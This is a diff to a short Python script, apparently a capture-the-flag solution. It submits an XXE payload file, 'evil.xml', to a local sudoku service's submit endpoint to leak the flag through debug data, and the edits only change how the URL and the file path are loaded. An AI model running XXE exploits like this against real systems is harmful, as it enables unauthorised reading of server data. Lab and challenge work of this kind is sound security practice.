@@ -2,7 +2,8 @@
 
 import requests
 
-URL = "http://127.0.0.1:1337"
+import os
+URL = os.environ.get("URL", "http://127.0.0.1:24304")
 
 # Set difficulty to "debug"
 S = requests.Session()
@@ -13,7 +14,8 @@ headers = {
     'Content-Type': 'application/xml',
 }
 
-xml_data = open("evil.xml").read()
+import os.path as _op
+xml_data = open(_op.join(_op.dirname(__file__), "evil.xml")).read()
 
 # Send malicious board with XXE payload to get flag in debug data
 response = S.post(URL+"/sudoku/submit", data=xml_data, headers=headers)
